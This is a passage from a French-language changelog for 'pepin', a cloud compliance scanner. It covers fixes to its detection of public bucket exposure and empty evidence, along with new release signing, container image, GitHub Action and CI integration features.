  insuffisants ou inventaire tronqué produisaient le même résultat vide qu'un
  tenant sain, et la porte de CI passait au vert sur un périmètre jamais regardé.
  Le code `3` le dit maintenant, sans exiger `--strict`.
- **Quatorze contrôles ne concluent plus `pass` sans la donnée décisive.** Le
  verrou de capacité gagne treize entrées, et une collection vide ne compte plus
  comme collectée : le collecteur IAM pose toujours `statements`, à `[]` quand un
  document ne s'analyse pas, si bien que quatre contrôles critical/high
  concluaient « conforme » sur zéro information.
- **`authenticated-read` et `AuthenticatedUsers` sont détectés** comme exposition
  publique : les deux accordent la lecture à tout utilisateur authentifié de la
  plateforme, donc hors du tenant.
- **Un bucket rendu public par une `acl` en ligne** sur `scaleway_object_bucket`
  est enfin collecté ; il produisait auparavant zéro finding et un verdict
  « conforme ».
- **Les booléens transmis en chaîne sont honorés.** Un plan Terraform rend
  certains attributs de schéma en `"true"`/`"false"`, et `== false` est
  simplement faux pour `"false"` ; 25 comparaisons dans 16 règles passent
  désormais par `truthy()`.
- **Une région non cataloguée est signalée** au lieu de passer en silence : les
  tables de classification sont des listes blanches, et leur silence valait
  « en UE ».
- **Normalisation réseau** : `-1`, `any` et un protocole vide signifient tous
  « tout protocole », et un scalaire là où le modèle attend une liste ne rend
  plus la règle indéfinie — un export portant `"cidrs": "0.0.0.0/0"` n'était pas
  signalé.
- **Sévérités de `CLD-CHF-2` alignées** sur `high` pour ses trois contrôles : la
  sévérité pilote la porte de CI, et l'écart n'était pas justifié.

### Ajouté

- **La surface publique est gelée par des tests, pas par de la prose.** Les
  verbes, flags et codes de sortie de la CLI, le document findings de
  `--format json`, le document assessment et la forme du bundle de preuve ont
  chacun une fixture committée sous `cmd/testdata/frozen/` : l'arbre de
  champs, jamais une valeur. Une forme qui bouge sans sa fixture fait échouer
  la CI ; une fixture régénérée sans que la version déclarée bouge aussi. La
  version du bundle voyage sur le fil comme suffixe `/vN` du champ `format`
  de `manifest.json` ; un vérificateur qui rencontre une version inconnue
  doit s'arrêter plutôt que deviner.
- **L'index SCSL est surveillé en dérive.** `mise run scsl-drift` compare
  l'index vivant de `framework-scsl` à une baseline committée dans
  `referentiel/scsl-baseline.json` et sort en 2 quand une exigence CLD a été
  ajoutée, retirée ou reformulée en amont sans qu'un humain retrie les
  mappings. La convention de sortie de l'outillage (0 ok, 1 erreur,
  **2 dérive**) est volontairement distincte de celle de `pepin scan` (où 2
  est l'erreur technique).
- **Une release se refuse avant le tag, pas se regrette après.**
  `mise run release-check -- vX.Y.Z` rejoue hors ligne tout ce qui doit
  tenir : arbre propre sur `main`, tag libre, tests et cohérence du
  référentiel, zéro dérive SCSL, les codes de sortie répondus par le binaire
  construit plutôt que lus dans une constante, un bundle scellé qui se
  vérifie, se re-dérive **et se refuse une fois altéré**, la version que les
  Conventional Commits impliquent (`.cz.toml`), et les deux CHANGELOG portant
  la section d'où le corps de la release se lit.
- **Un tag construit, atteste et signe la release.**
  `.github/workflows/release.yml` construit les binaires `linux`/`darwin` ×
  `amd64`/`arm64` avec le tag gravé dedans, génère les empreintes SHA-256 et
  un SBOM CycloneDX, enregistre la provenance de build SLSA, signe les
  empreintes en Cosign keyless, et publie la GitHub Release avec la section
  correspondante de ce fichier pour corps.
- **Une image de conteneur** (`ghcr.io/stephrobert/pepin`, un tag par
  release, pas de `latest`) : les binaires linux publiés sur une base
  distroless épinglée par digest, avec les certificats racines pour le TLS de
  `--live`, l'utilisateur 65532 et pas de shell. Rien n'est compilé dans le
  Dockerfile, donc les empreintes, le SBOM et la provenance de la release
  décrivent aussi le contenu de l'image ; l'image porte sa propre provenance
  SLSA, sa propre attestation de SBOM et une signature keyless, et la release
  refuse une image dont le `pepin version` n'est pas le tag ou dont les codes
  de sortie ont bougé à travers `docker run`.
- **Une action GitHub composite** (`.github/actions/pepin-scan`) qui vérifie
  le SHA-256 du binaire téléchargé contre la liste d'empreintes de la release
  avant de l'exécuter, scanne un plan Terraform, un inventaire ou l'API live,
  et traduit les codes de sortie en porte de CI :
  `fail-on-nonconformity: 'false'` rétrograde un verdict non conforme (1, ou
  3 sous strict) en avertissement, et ne rétrograde jamais une erreur
  technique (2). Les identifiants ne sont jamais des entrées de l'action ;
  les variables natives du provider passent par `env:`. La CI corrompt un
  octet du téléchargement et exige le refus (`entrypoints.yml`), et chaque
  release rejoue l'action contre ses propres artefacts publiés.
- **Un modèle GitLab CI et des exemples de CI**
  (`examples/gitlab-ci/`, `examples/github-actions/`) : même téléchargement
  vérifié, même contrat de codes de sortie, mode rapport via
  `allow_failure: exit_codes: [1, 3]`, jamais 2. L'installation et la
  vérification des quatre portes d'entrée sont documentées dans
  `docs/install.md` / `docs/install.fr.md`.
